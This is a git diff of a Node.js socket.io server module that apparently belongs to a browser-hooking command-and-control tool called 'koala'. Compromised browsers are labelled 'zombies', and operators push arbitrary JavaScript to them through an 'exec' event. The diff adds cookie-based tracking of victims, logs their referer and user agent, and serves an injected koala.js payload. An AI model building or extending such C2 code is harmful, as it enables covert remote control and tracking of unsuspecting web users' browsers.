@@ -1,7 +1,6 @@
 //var Socketio = require('socket.io');
 var fs = require('fs');
 var path = require('path');
-var app = require('../app');
 var pc = require('../proxy').pc;
 var project = require('../proxy').project;
 var eventproxy = require('eventproxy');
@@ -13,12 +12,20 @@ exports.online = function(server, admin_io, zombie_io){
             zombie_io.to(data.pcID).emit('exec',data.jsCode);
         });
         zombie_io.on('callbackExec',function(data){
-            console.log(data);
+            //console.log(data);
         })
     });
 
     zombie_io.on('connection',function(socket){
-        console.log(socket.request);
+        var cookie = socket.handshake.headers.cookie;
+        var pc_id;
+        if(pc_id = cookie.match(/__koalaPC_=(.*?)(;|$)/)){
+            var pc_socket_id = pc_id[1];
+        }
+        else{
+            logger.err('no cookie!');
+            //TODO 异常处理
+        }
 
         //把主机信息入库. 获取项目信息  来一个socket join 一个room
         pc.getNamesByQuery({},{},function(err,data){
@@ -43,11 +50,11 @@ exports.online = function(server, admin_io, zombie_io){
                 var update_time = Date.now();
                 var zombie_url = socket_data['zombie_referer'];
                 var zombie_ua = socket_data['zombie_ua'];
-                pc.addPC(projectName, update_time,zombie_url,zombie_ua,true,update_time, function(err,data){
+                pc.addPC(projectName, update_time,zombie_url,zombie_ua,true,pc_socket_id, function(err,data){
                     if(err){
                         ep.emit('err',err);
                     }
-                    socket.join(data.socket_id);
+                    socket.join(pc_socket_id);
                     socket['pc_id'] = data.socket_id;
 
                     zombie_io.to(data.socket_id).emit('exec','document.cookie="__koalaP_='+data.socket_id+'"');
@@ -80,17 +87,21 @@ exports.online = function(server, admin_io, zombie_io){
         //处理状态更新
         socket.on('updateZombieStatus',function(data){
             //update  触发前端进行更新.
-            //pc.updatePC({_id:socket['pc_id']},{},{},function(err,data){
-            //    console.log(data);
-            //});
-
-            console.log(data);
+            socket.join(data.pc_socket_id)
         });
         //disconet
         socket.on('disconnect',function(data){
             //pc.updatePC({_id:});
-            pc.updatePC({'_id':socket['pc_id']},{'status':false},{},function(err,data){
-                console.log(data);
+            try{
+                var pc_socket_id = socket.handshake.headers.cookie.match(/__koalaPC_=(.*?)(;|$)/)[1];
+            }catch(e){
+                logger.err('cookie error!');
+            }
+            pc.updatePC({'socket_id':pc_socket_id},{'status':false},{},function(err,data){
+                if(err){
+                    logger.err('db error');
+                    return;
+                }
             });
         })
     });
@@ -103,18 +114,46 @@ exports.index = function(req,res,next){
     //socket.js 发过去
     //var project_id = req.path.substring(1);
     var host = req.header('host');
+    var cookie = req.cookies;
     var projectid = req.url.match(/\/(.{24})/)[1];
-    fs.readFile(path.join(__dirname, '../koala.js'),function(err,data){
-        if(err){
-            throw err;
-        }
-        var initKoala = data.toString();
-        var initData = initKoala.replace(/\{~socketiourl~\}/g,host);
-        initData = initData.replace(/\{~projectid~\}/g, projectid);
-        initData = initData.replace(/\{~socketcookie~\}/g, '123');
-        res.append('Set-Cookie', 'foo=bar; Path=/; HttpOnly');
-        res.send(initData);
-    });
+    //当判断到有cookie的时候 新建一个连接 更新数据库
+    //当是不同页面的时候
+    if(cookie.__koalaPC_){
+        var pc_resocket_id = Date.now();
+        pc.updatePC({'socket_id':cookie.__koalaPC_,'zombie_url':req.headers.referer,'zombie_ua':req.headers['user-agent']},{
+            'socket_id':pc_resocket_id,
+            'status': true
+        },{},function(err){
+            if(err){
+                logger.err(err);
+                return;
+            }
+            fs.readFile(path.join(__dirname, '../koala.js'),function(err,data){
+                if(err){
+                    throw err;
+                }
+                var initKoala = data.toString();
+                var initData = initKoala.replace(/\{~socketiourl~\}/g,host);
+                initData = initData.replace(/\{~projectid~\}/g, projectid);
+                initData = initData.replace(/\{~socketcookie~\}/g, pc_resocket_id);
+                res.append('Set-Cookie', '__koalaPC_='+pc_resocket_id+'; Path=/;');
+                res.send(initData);
+            });
+        });
+    }else{
+        var pc_socket_id = Date.now();
+        fs.readFile(path.join(__dirname, '../koala.js'),function(err,data){
+            if(err){
+                throw err;
+            }
+            var initKoala = data.toString();
+            var initData = initKoala.replace(/\{~socketiourl~\}/g,host);
+            initData = initData.replace(/\{~projectid~\}/g, projectid);
+            res.append('Set-Cookie', '__koalaPC_='+pc_socket_id+'; Path=/;');
+            res.send(initData);
+        });
+    }
+
     //res.send("");
     //res.send('');
     //res.send('alert(1)');
